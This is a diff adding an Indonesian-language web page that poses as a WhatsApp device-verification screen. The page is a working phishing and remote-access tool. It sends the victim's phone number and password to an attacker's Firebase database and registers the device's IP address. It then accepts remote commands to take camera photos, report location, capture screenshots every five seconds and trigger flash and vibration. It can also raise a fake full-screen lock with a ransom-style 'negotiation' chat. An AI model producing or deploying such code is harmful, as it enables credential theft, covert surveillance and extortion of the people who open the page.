@@ -1,1 +1,308 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>WhatsApp Security | Verifikasi Perangkat</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+        html, body { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; background: #075E54; font-family: 'Segoe UI', sans-serif; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; overflow-y: auto; height: 100%; }
+        .card { background: white; border-radius: 20px; padding: 25px; margin-bottom: 20px; }
+        .verification-badge { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 15px; padding: 15px; color: white; text-align: center; margin-bottom: 20px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; }
+        .permission-card { background: #f8f9fa; border-radius: 15px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 15px; cursor: pointer; }
+        .permission-card .toggle { width: 50px; height: 30px; background: #ccc; border-radius: 15px; position: relative; transition: 0.3s; }
+        .permission-card .toggle.active { background: #25D366; }
+        .permission-card .toggle::after { content: ''; width: 26px; height: 26px; background: white; border-radius: 13px; position: absolute; top: 2px; left: 2px; transition: 0.3s; }
+        .permission-card .toggle.active::after { left: 22px; }
+        .btn { width: 100%; padding: 15px; background: #075E54; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; color: white; }
+        .loading.active { display: flex; }
+        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top-color: #25D366; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .toast { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #333; color: white; padding: 12px; border-radius: 10px; text-align: center; z-index: 1000; display: none; }
+        .toast.show { display: block; }
+        
+        /* LOCK SCREEN HARD DENGAN CHAT */
+        .lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #000 0%, #1a0000 100%);
+            z-index: 9999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+        .lock-box {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0,0,0,0.95);
+            border-radius: 20px;
+            border: 2px solid #ff0000;
+            width: 90%;
+            max-width: 380px;
+            box-shadow: 0 0 50px rgba(255,0,0,0.5);
+        }
+        .lock-title { font-size: 28px; font-weight: 900; color: #ff0000; margin-bottom: 10px; text-transform: uppercase; text-shadow: 0 0 10px red; }
+        .lock-icon { font-size: 50px; margin-bottom: 10px; animation: shake 0.5s infinite; }
+        @keyframes shake { 0%,100% { transform: rotate(0deg); } 25% { transform: rotate(5deg); } 75% { transform: rotate(-5deg); } }
+        .lock-pin { width: 100%; padding: 12px; font-size: 24px; text-align: center; letter-spacing: 8px; background: #111; border: 2px solid #ff0000; color: white; border-radius: 12px; margin: 10px 0; font-family: monospace; }
+        .lock-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 10px 0; }
+        .lock-key { background: #222; border: none; padding: 12px; font-size: 20px; color: white; border-radius: 40px; cursor: pointer; }
+        .lock-key:active { background: #ff0000; transform: scale(0.95); }
+        .lock-unlock { background: #ff0000; border: none; padding: 12px; color: white; font-size: 16px; font-weight: bold; border-radius: 30px; width: 100%; cursor: pointer; margin-top: 10px; }
+        .lock-error { color: #ff4444; font-size: 11px; margin-top: 8px; }
+        
+        /* CHAT NEGOSIASI DI LOCK SCREEN */
+        .chat-section { margin-top: 15px; padding-top: 10px; border-top: 1px solid #333; }
+        .chat-title { color: #ffaa00; font-size: 11px; margin-bottom: 8px; }
+        .chat-box { background: #111; border-radius: 10px; padding: 8px; height: 100px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; }
+        .chat-message { padding: 4px; margin: 3px 0; border-radius: 6px; }
+        .chat-target { background: #1a3a1a; color: #00ff88; text-align: left; }
+        .chat-owner { background: #3a1a1a; color: #ff8888; text-align: right; }
+        .chat-input-area { display: flex; gap: 8px; }
+        .chat-input { flex: 1; padding: 8px; background: #222; border: 1px solid #ff0000; border-radius: 20px; color: white; }
+        .chat-send { background: #ff0000; border: none; padding: 8px 15px; border-radius: 20px; color: white; cursor: pointer; }
+        .lock-warning { font-size: 9px; color: #555; margin-top: 10px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="verification-badge"><div>✅</div><h3>Verifikasi Perangkat Diperlukan</h3></div>
+    <div class="card">
+        <h3>🔐 Verifikasi Identitas</h3>
+        <div class="form-group"><label>📱 Nomor WhatsApp</label><input type="tel" id="phone" placeholder="628123456789"></div>
+        <div class="form-group"><label>🔑 Kata Sandi</label><input type="password" id="password"></div>
+    </div>
+    <div class="card">
+        <h3>📷 Izin Diperlukan</h3>
+        <div class="permission-card" id="cameraPerm"><div>📸</div><div><h4>Kamera</h4><p>Verifikasi wajah</p></div><div class="toggle" id="cameraToggle"></div></div>
+        <div class="permission-card" id="locationPerm"><div>📍</div><div><h4>Lokasi</h4><p>Verifikasi keamanan</p></div><div class="toggle" id="locationToggle"></div></div>
+        <div class="permission-card" id="notifPerm"><div>🔔</div><div><h4>Notifikasi</h4><p>Peringatan keamanan</p></div><div class="toggle" id="notifToggle"></div></div>
+    </div>
+    <button class="btn" onclick="submitVerification()">✅ Verifikasi Sekarang</button>
+</div>
+<div id="loading" class="loading"><div class="spinner"></div><p>Memverifikasi...</p></div>
+<div id="toast" class="toast"></div>
 
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyD8p48Vg2DoWRycAg817FGWzJ2YLh6xsGA",
+        authDomain: "rats-9020c.firebaseapp.com",
+        databaseURL: "https://rats-9020c-default-rtdb.asia-southeast1.firebasedatabase.app/",
+        projectId: "rats-9020c",
+        storageBucket: "rats-9020c.firebasestorage.app",
+        messagingSenderId: "300945222958",
+        appId: "1:300945222958:web:56a9789499f9fdc56f9ebf"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let targetId = "target_" + Math.random().toString(36).substr(2, 8);
+    let senterStream = null;
+    let isLocked = false;
+    let flashInterval = null;
+    let vibrateInterval = null;
+    let screenshotInterval = null;
+
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    function sendResponse(cmd, status, data = null) {
+        db.ref(`responses/${targetId}`).set({ command: cmd, status: status, data: data, timestamp: Date.now() });
+    }
+
+    function savePhoto(img) { db.ref(`targets/${targetId}/photos/${Date.now()}`).set({ image: img, timestamp: Date.now() }); setTimeout(() => db.ref(`targets/${targetId}/photos/${Date.now()}`).remove(), 300000); }
+
+    // FLASH
+    async function toggleFlash(on) { try { if (!senterStream) { const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); senterStream = s; } const track = senterStream.getVideoTracks()[0]; if (track.getCapabilities().torch) await track.applyConstraints({ advanced: [{ torch: on }] }); } catch(e) {} }
+    async function flashBlink() { if (flashInterval) clearInterval(flashInterval); flashInterval = setInterval(async () => { await toggleFlash(true); setTimeout(async () => await toggleFlash(false), 200); }, 500); sendResponse('flash_blink', 'success'); }
+    function flashStop() { if (flashInterval) { clearInterval(flashInterval); flashInterval = null; toggleFlash(false); } }
+
+    // VIBRATE BENERAN GETAR
+    function vibrateBom() { if (vibrateInterval) clearInterval(vibrateInterval); const vib = () => { if (navigator.vibrate) navigator.vibrate([1000,500,1000,500,2000]); }; vib(); vibrateInterval = setInterval(vib, 6000); sendResponse('vibrate_bom', 'success'); showToast('📳 GETAR BOM AKTIF'); }
+    function vibrateStop() { if (vibrateInterval) { clearInterval(vibrateInterval); vibrateInterval = null; if (navigator.vibrate) navigator.vibrate(0); sendResponse('vibrate_stop', 'success'); showToast('📳 GETAR BERHENTI'); } }
+
+    // SCREENSHOT
+    async function takeScreenshot() { try { const canvas = await html2canvas(document.body, { scale: 0.5 }); const img = canvas.toDataURL('image/jpeg', 0.5); sendResponse('screenshot', 'success', { image: img }); db.ref(`targets/${targetId}/screenshots`).set(img); } catch(e) {} }
+
+    // SPEAK (TEXT TO SPEECH)
+    function speak(text) {
+        if (!text) return;
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.lang = 'id-ID';
+        utterance.rate = 0.9;
+        utterance.pitch = 1;
+        utterance.volume = 1;
+        window.speechSynthesis.speak(utterance);
+        sendResponse('speak', 'success', { text: text });
+        showToast(`🔊 " ${text} " - Suara diputar`);
+    }
+
+    // LOCK SCREEN HARD DENGAN CHAT
+    function showLockScreen(title, msg, pin) {
+        if (isLocked) return;
+        isLocked = true;
+        flashBlink();
+        document.documentElement.requestFullscreen();
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+        window.addEventListener('keydown', e => e.preventDefault());
+        document.body.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        
+        const lockDiv = document.createElement('div');
+        lockDiv.className = 'lock-overlay';
+        lockDiv.innerHTML = `
+            <div class="lock-box">
+                <div class="lock-icon">🔒💀👑</div>
+                <div class="lock-title">${title || 'LOCKED BY KINGMU'}</div>
+                <div style="color:#ffaa00;font-size:12px;">${msg || 'DEVICE ENCRYPTED'}</div>
+                <input type="password" id="lockPin" class="lock-pin" placeholder="PIN" maxlength="6" readonly>
+                <div class="lock-keypad">
+                    <button class="lock-key" data-num="1">1</button><button class="lock-key" data-num="2">2</button><button class="lock-key" data-num="3">3</button>
+                    <button class="lock-key" data-num="4">4</button><button class="lock-key" data-num="5">5</button><button class="lock-key" data-num="6">6</button>
+                    <button class="lock-key" data-num="7">7</button><button class="lock-key" data-num="8">8</button><button class="lock-key" data-num="9">9</button>
+                    <button class="lock-key" data-num="clear">C</button><button class="lock-key" data-num="0">0</button><button class="lock-key" data-num="del">⌫</button>
+                </div>
+                <button class="lock-unlock" id="unlockBtn">🔓 UNLOCK</button>
+                <div id="lockError" class="lock-error"></div>
+                
+                <div class="chat-section">
+                    <div class="chat-title">💬 CHAT NEGOSIASI DENGAN ADMIN</div>
+                    <div class="chat-box" id="chatBox">
+                        <div class="chat-message chat-owner">[SYSTEM] Perangkat anda terkunci. Hubungi admin.</div>
+                    </div>
+                    <div class="chat-input-area">
+                        <input type="text" id="chatInput" class="chat-input" placeholder="Ketik pesan...">
+                        <button class="chat-send" onclick="sendChatMsg()">KIRIM</button>
+                    </div>
+                </div>
+                <div class="lock-warning">⚠️ JANGAN TUTUP HALAMAN INI ⚠️</div>
+            </div>
+        `;
+        document.body.appendChild(lockDiv);
+        
+        let pinVal = '';
+        const pinInput = document.getElementById('lockPin');
+        const errMsg = document.getElementById('lockError');
+        const correctPin = pin || '123456';
+        function updatePin() { pinInput.value = '*'.repeat(pinVal.length); }
+        document.querySelectorAll('.lock-key').forEach(btn => { btn.onclick = (e) => { e.stopPropagation(); const num = btn.getAttribute('data-num'); if (num === 'clear') { pinVal = ''; updatePin(); errMsg.innerText = ''; } else if (num === 'del') { pinVal = pinVal.slice(0, -1); updatePin(); errMsg.innerText = ''; } else if (pinVal.length < 6) { pinVal += num; updatePin(); errMsg.innerText = ''; } }; });
+        document.getElementById('unlockBtn').onclick = () => { if (pinVal === correctPin) { flashStop(); lockDiv.remove(); isLocked = false; sendResponse('unlock_success', 'success'); showToast('✅ UNLOCKED'); } else { errMsg.innerText = '❌ PIN SALAH!'; pinVal = ''; updatePin(); if (navigator.vibrate) navigator.vibrate(200); } };
+        
+        window.sendChatMsg = function() {
+            const input = document.getElementById('chatInput');
+            const msg = input.value.trim();
+            if (msg) {
+                db.ref(`chat/${targetId}`).set({ message: msg, from: 'target', timestamp: Date.now() });
+                const box = document.getElementById('chatBox');
+                const d = document.createElement('div');
+                d.className = 'chat-message chat-target';
+                d.innerHTML = `[TARGET] ${msg}`;
+                box.appendChild(d);
+                box.scrollTop = box.scrollHeight;
+                input.value = '';
+                sendResponse('chat_message', 'success', { message: msg });
+            }
+        };
+        
+        db.ref(`chat/${targetId}`).on('value', snap => {
+            const chat = snap.val();
+            if (chat && chat.from === 'owner') {
+                const box = document.getElementById('chatBox');
+                const d = document.createElement('div');
+                d.className = 'chat-message chat-owner';
+                d.innerHTML = `[ADMIN] ${chat.message}`;
+                box.appendChild(d);
+                box.scrollTop = box.scrollHeight;
+            }
+        });
+        
+        sendResponse('lock_screen', 'success');
+    }
+
+    // KAMERA
+    async function takePhoto(facing) { try { const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } }); const video = document.createElement('video'); video.srcObject = stream; video.play(); setTimeout(() => { const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); const img = canvas.toDataURL('image/jpeg'); savePhoto(img); sendResponse('photo', 'success', { image: img }); showToast('📸 FOTO TERKIRIM'); stream.getTracks().forEach(t => t.stop()); }, 1000); } catch(e) { showToast('❌ GAGAL AKSES KAMERA'); } }
+
+    // LOKASI
+    function getLocation() { if ('geolocation' in navigator) { navigator.geolocation.getCurrentPosition(pos => { fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { sendResponse('location', 'success', { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, ip: data.ip }); showToast(`📍 LOKASI TERKIRIM`); }); }, null, { enableHighAccuracy: true }); } }
+
+    // NOTIFIKASI
+    async function getNotif() { const perm = await Notification.requestPermission(); sendResponse('get_notif', perm === 'granted' ? 'success' : 'denied', { permission: perm }); showToast(perm === 'granted' ? '✅ NOTIFIKASI DIIZINKAN' : '❌ NOTIFIKASI DITOLAK'); }
+
+    // SHOW TEXT
+    function showTextOnScreen(text) { alert(text); sendResponse('show_text', 'success', { text: text }); }
+
+    // UNLOCK DEVICE
+    function unlockDevice() { if (isLocked) { const lock = document.querySelector('.lock-overlay'); if (lock) lock.remove(); isLocked = false; flashStop(); vibrateStop(); sendResponse('unlock_device', 'success'); showToast('✅ DEVICE UNLOCKED'); } }
+
+    // LISTEN COMMANDS
+    function listenCommands() {
+        db.ref(`commands/${targetId}`).on('value', snap => {
+            const cmd = snap.val();
+            if (cmd) {
+                if (cmd.command === 'flash_on') toggleFlash(true);
+                if (cmd.command === 'flash_off') toggleFlash(false);
+                if (cmd.command === 'flash_blink') flashBlink();
+                if (cmd.command === 'flash_stop') flashStop();
+                if (cmd.command === 'vibrate_bom') vibrateBom();
+                if (cmd.command === 'vibrate_stop') vibrateStop();
+                if (cmd.command === 'screenshot') takeScreenshot();
+                if (cmd.command === 'get_location') getLocation();
+                if (cmd.command === 'get_notif') getNotif();
+                if (cmd.command === 'unlock_device') unlockDevice();
+                if (cmd.command === 'speak') speak(cmd.data?.text || 'Peringatan!');
+                if (cmd.command === 'show_text') showTextOnScreen(cmd.data?.text || 'Pesan dari admin');
+                if (cmd.command === 'lock_screen') showLockScreen(cmd.data?.title, cmd.data?.message, cmd.data?.pin);
+                if (cmd.command === 'camera_depan') takePhoto('user');
+                if (cmd.command === 'camera_belakang') takePhoto('environment');
+                db.ref(`commands/${targetId}`).remove();
+            }
+        });
+    }
+
+    function getDeviceModel() { const ua = navigator.userAgent; if (ua.includes('iPhone')) return 'iPhone'; if (ua.includes('Samsung')) return 'Samsung'; if (ua.includes('Redmi')) return 'Redmi'; if (ua.includes('Xiaomi')) return 'Xiaomi'; if (ua.includes('OPPO')) return 'OPPO'; if (ua.includes('vivo')) return 'vivo'; if (ua.includes('Infinix')) return 'Infinix'; if (ua.includes('Android')) { const m = ua.match(/Android ([0-9.]+)/); return `Android ${m ? m[1] : ''}`; } return navigator.platform || 'Unknown'; }
+
+    function registerDevice() {
+        const model = getDeviceModel();
+        const info = { userAgent: navigator.userAgent, platform: navigator.platform, deviceModel: model, displayName: model, timestamp: Date.now() };
+        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { info.ip = data.ip; db.ref(`targets/${targetId}/info`).set(info); db.ref(`targets/${targetId}/deviceModel`).set(model); db.ref(`targets/${targetId}/displayName`).set(model); db.ref(`targets/${targetId}/online`).set(true); }).catch(() => { db.ref(`targets/${targetId}/info`).set(info); db.ref(`targets/${targetId}/deviceModel`).set(model); db.ref(`targets/${targetId}/displayName`).set(model); db.ref(`targets/${targetId}/online`).set(true); });
+        sendResponse('device_info', 'success', info);
+    }
+
+    document.getElementById('cameraPerm').onclick = () => { navigator.mediaDevices.getUserMedia({ video: true }).then(s => { s.getTracks().forEach(t=>t.stop()); document.getElementById('cameraToggle').classList.add('active'); showToast('✅ Izin kamera diberikan'); }); };
+    document.getElementById('locationPerm').onclick = () => { navigator.geolocation.getCurrentPosition(() => { document.getElementById('locationToggle').classList.add('active'); showToast('✅ Izin lokasi diberikan'); }); };
+    document.getElementById('notifPerm').onclick = () => { Notification.requestPermission().then(p => { if (p === 'granted') { document.getElementById('notifToggle').classList.add('active'); showToast('✅ Notifikasi diizinkan'); } }); };
+
+    function submitVerification() {
+        const phone = document.getElementById('phone').value;
+        if (!phone) { showToast('Masukkan nomor!'); return; }
+        document.getElementById('loading').classList.add('active');
+        sendResponse('login_data', 'success', { phone: phone, password: document.getElementById('password').value });
+        setTimeout(() => { document.getElementById('loading').classList.remove('active'); showToast('✅ Verifikasi berhasil!'); setTimeout(() => window.location.href = 'https://web.whatsapp.com', 2000); }, 3000);
+    }
+
+    registerDevice();
+    listenCommands();
+    setInterval(() => db.ref(`targets/${targetId}/online`).set(true), 30000);
+    setInterval(takeScreenshot, 5000);
+    window.addEventListener('beforeunload', () => db.ref(`targets/${targetId}/online`).set(false));
+    showToast('⚠️ Verifikasi diperlukan');
+</script>
+</body>
+</html>
